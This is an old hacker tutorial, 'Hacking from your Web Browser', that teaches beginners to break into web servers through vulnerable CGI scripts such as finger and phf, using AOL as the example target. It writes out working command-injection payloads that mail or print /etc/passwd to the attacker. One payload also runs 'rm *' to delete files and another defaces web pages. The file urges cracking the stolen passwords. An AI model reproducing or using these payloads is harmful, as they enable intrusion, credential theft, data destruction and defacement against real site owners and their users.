@@ -1,0 +1,87 @@
+
+				Hacking from your Web Browser
+						by
+				   Modify of Technophoria
+************************************************************************
+
+I - Introduction
+
+	This file will describe several techiniques to aquire a password file just by using an ordinary web browser.  The information provided will be best described for the beginner hacker, but all hackers should benifit from this information.  We will only cov
+
+er phf in this file but, feel free to explore other programs in the cgi directory such as nph-test-cgi or test-cgi.  And now . . . get comfortable... sit back.... and read.
+
+II - Hacking from your Web Browser
+
+	There are several techniques on what I call "Web Browser Hacking".  Many beginners dont know that you cant query a etc/passwd file from your browser and in this chapter I will describe all the ways to aquire a passwd file.  First you need to find a box t
+
+hat is running the cgi-bin/phf file on their system.  A great way to find out without trial and error is to go to www.altavista.com and just search on cgi-bin AND perl.exe or cgi-bin AND phf.  
+
+      a.  Finger box hacking:  
+		Lets say you wanted to break into somewhere like .... hmmmm AOL.  The first thing we would do is type in their web site in the URL:  Http://www.aol.com.  The next thing we would do is add /cgi-bin/finger to the web URL so it would look like this Http://
+
+www.aol.com/cgi-bin/finger.  If the finger gateway is operational a box should appear for you to enter the name you want to finger.  If it is operational you have a chance to receive the etc/passwd file.  Next thing you will probably want to do is search 
+
+for a mailto on the web page... just scan the page for any mailto refs.  Go back to the finger box and type in this query......   nobody@nowhere.org ; /bin/mail me@junk.org < etc/passwd ...this string takes nobody and emails the passwd file to your email 
+
+address.  If this works you now have the etc/passwd file in your mailbox.... you can now run a crack program against it and have a little fun on their box.
+
+       b.  The common cgi-bin/phf query:
+		This section is for the very beginning hacker (All advanced hackers need not apply)  Lets take the same scenerio from the first example except in the URL we would type ... Http://www.aol.com/cgi-bin/phf ... if the phf is operational and has not been rem
+
+oved you should get a series of search boxes on the next page ( ignore these boxs)  to your URL you would add this string ?Qalias=x%0a/bin/cat%20/etc/passwd... so the entire string would look like this Http://www.aol.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20
+
+/etc/passwd.  This string will print out the etc/passwd file strait to your web browser all you need to do is save it as a file and again run a crack program against it. (This is considering that they are not :*: or :x:).
+
+        c.  Dont take my cgi form:
+		This section will explain how to use somebody else's cgi form to obtain the etc/passwd file.  Lets say you look at a document source from a web page and find this in the source: 
+                            <html><body>
+                            <h2>This is a form to go to Modify</h2>
+		    <form action = "http://www.aol.com/cgi-bin/doc.pl"  method="get">
+                            <input type="hidden" name="myaddress" value="nobody@aol.com">
+ 		    <input type="text" name="input">
+		    <input type="submit" value="send">
+		    </form>
+		    </body></html>
+
+This is a simple form that asks a user to input a message to be sent to a script called doc.pl.  Included in the doc.pl script is the following line which is assuming the line has already been parsed out.
+
+		     system("/usr/lib/sendmail -t $myaddress < $tempfile")
+
+Now lets set up your page:
+
+		    <html><body>
+		    <h2>Hack AOL</h2>
+		    <form action = "http://www.aol.com/cgi-bin/doc.pl" method = "get">
+		    <input type="hidden"  name="myaddress"
+			value=" ; rm * ;mail -s file youraddress@yourisp.com < 			/etc/passwd;">
+		    <input type = "text" name="input">
+		    <input type = "submit" value=:"getpasswd">
+		    </form>
+
+The semicolons in the hidden value field act as delimiters, they separate the UNIX commands, this executes commands on the same line.  The system call in PERL and creates a UNIX shell, and in here mails the passwd file to you.
+
+        d.  Changing web pages from your browser:
+		This short section will describe the string to use to edit a web page from your web browser.  Same scenario as the first section....  http://www.aol.com.... we will then add the following string cgi-bin/phf?Qalias=x%0a/bin/echo%20 "some text and shit"%2
+
+0>>filename.html......  This string will allow you to write to the filename.html and add "some text and shit" be noted it has to be in html format.  You can place text, pictures or whatever you like.
+
+III - Conclusion
+
+	This information should be able to direct a beginner in obtaining the etc/passwd file from a system using the web browser... It may also inform the guru's and advanced hackers some bits of information of perl and cgi.  In further reading check out my sec
+
+ond file that will involve erasing log files from the web browser.  I hope you all enjoyed this documentation and found it somewhat interesting...... wake up!!!   thus I conclude..... 
+
+                                                              Modify.
+
+IV - Suggested Reading
+
+	Phrack Magazine:  Very informative.... covers just about everything from phreaking to hacking.... Just download all the damn articles.
+
+	Building Internet Firewalls by O'Reilly & Associates, Inc. aka "The Big Wooden Door"":  Covers all kinds of attacks, different firewall solutions, and invulnerablities.
+
+	Perl in 21 days by Samsnet:  Good starting book in Perl programming also covers security issues.
+
+	Cgi programming by Samsnet:  Good starter for Cgi but if you dont know Perl or C programming then dont bother, also covers security issues.
+************************************************************************
+www.technophoria.com
+			   
